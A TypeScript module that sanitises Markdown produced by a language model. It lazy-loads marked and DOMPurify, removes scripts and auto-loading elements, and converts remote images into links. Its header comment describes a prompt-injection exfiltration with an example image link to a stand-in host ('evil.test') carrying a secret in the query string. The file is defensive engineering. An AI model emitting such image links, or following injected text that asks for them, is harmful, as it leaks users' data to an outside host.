/**
 * Markdown rendering for model output.
 *
 * Model output is untrusted. It is parsed by marked and then sanitised by a
 * private DOMPurify instance, which returns DOM nodes directly, so no HTML
 * string is ever assigned to innerHTML. Both libraries are loaded on first
 * use (architecture rule 8: heavy libraries are lazy).
 *
 * Beyond removing scripts, the output may not make the browser contact any
 * other host by itself: a prompt-injected `![](https://evil.test/?q=secret)`
 * would otherwise leak data the moment it renders. Remote images become
 * ordinary links (alt text and host), and every other auto-loading element or
 * attribute is removed. Only `data:` and `blob:` images are shown inline.
 */

// Type-only imports: erased at build time, so the libraries stay out of the
// eager bundle.
import type { DOMPurify } from 'dompurify';
import type * as Marked from 'marked';

interface Libraries {
  marked: typeof Marked;
  purify: DOMPurify;
}

let libraries: Promise<Libraries> | undefined;

/** Loads both libraries once. A failed load is not remembered, so the next call retries. */
function loadLibraries(): Promise<Libraries> {
  libraries ??= Promise.all([import('marked'), import('dompurify')]).then(
    ([marked, { default: createPurify }]) => {
      // A private instance: hooks added here cannot leak into other users of DOMPurify.
      const purify = createPurify(window);
      purify.addHook('afterSanitizeAttributes', (node) => {
        if (node instanceof Element && node.localName === 'a' && node.hasAttribute('href')) {
          // In-page links stay in the page; everything else opens in a new tab
          // without a handle on, or a referrer from, this page.
          if (!(node.getAttribute('href') ?? '').startsWith('#')) {
            node.setAttribute('target', '_blank');
            node.setAttribute('rel', 'noopener noreferrer');
          }
        }
      });
      return { marked, purify };
    },
  );
  libraries.catch(() => {
    libraries = undefined;
  });
  return libraries;
}

/**
 * Renders Markdown to sanitised DOM.
 *
 * ```ts
 * output.replaceChildren(await renderMarkdown(text));
 * ```
 *
 * Removed: scripts, event handlers, `javascript:` URLs, styles, forms and
 * form controls (except GFM task-list checkboxes, which are disabled),
 * frames, embedded objects and media, `id`/`name` (which could clobber page
 * globals), and anything that would load a remote resource.
 */
export async function renderMarkdown(markdown: string): Promise<DocumentFragment> {
  const { marked, purify } = await loadLibraries();
  const html = await marked.parse(markdown, { async: true, gfm: true });
  const fragment = purify.sanitize(html, {
    RETURN_DOM_FRAGMENT: true,
    USE_PROFILES: { html: true },
    FORBID_TAGS: [
      'style',
      'form',
      'button',
      'textarea',
      'select',
      'iframe',
      'object',
      'embed',
      'audio',
      'video',
      'source',
      'track',
      'picture',
      'map',
      'area',
    ],
    FORBID_ATTR: ['style', 'id', 'name', 'background', 'poster', 'srcset', 'ping'],
    // DOMPurify's default URL allow-list plus `blob:` (object URLs this page made).
    ALLOWED_URI_REGEXP:
      /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix|blob):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i,
  });
  // The fragment still belongs to DOMPurify's inert document, so nothing in
  // it has started loading yet.
  neutraliseImages(fragment);
  keepOnlyTaskCheckboxes(fragment);
  return fragment;
}

/** Shows `data:`/`blob:` images inline; turns remote images into links and drops the rest. */
function neutraliseImages(root: DocumentFragment): void {
  for (const img of root.querySelectorAll('img')) {
    const src = img.getAttribute('src')?.trim() ?? '';
    if (/^(data|blob):/i.test(src)) continue;

    const alt = img.getAttribute('alt')?.trim() || 'Image';
    let replacement: Node = img.ownerDocument.createTextNode(alt);
    try {
      const target = new URL(src);
      if (target.protocol === 'https:' || target.protocol === 'http:') {
        const link = img.ownerDocument.createElement('a');
        link.href = target.href;
        link.target = '_blank';
        link.rel = 'noopener noreferrer';
        link.textContent = `${alt} (${target.host})`;
        replacement = link;
      }
    } catch {
      // Relative or malformed: nothing worth linking to.
    }
    img.replaceWith(replacement);
  }
}

/** GFM task lists render `<input type="checkbox" disabled>`; any other input is removed. */
function keepOnlyTaskCheckboxes(root: DocumentFragment): void {
  for (const input of root.querySelectorAll('input')) {
    if (input.getAttribute('type')?.toLowerCase() !== 'checkbox') {
      input.remove();
      continue;
    }
    for (const name of input.getAttributeNames()) {
      if (name !== 'type' && name !== 'checked') input.removeAttribute(name);
    }
    input.setAttribute('disabled', '');
  }
}
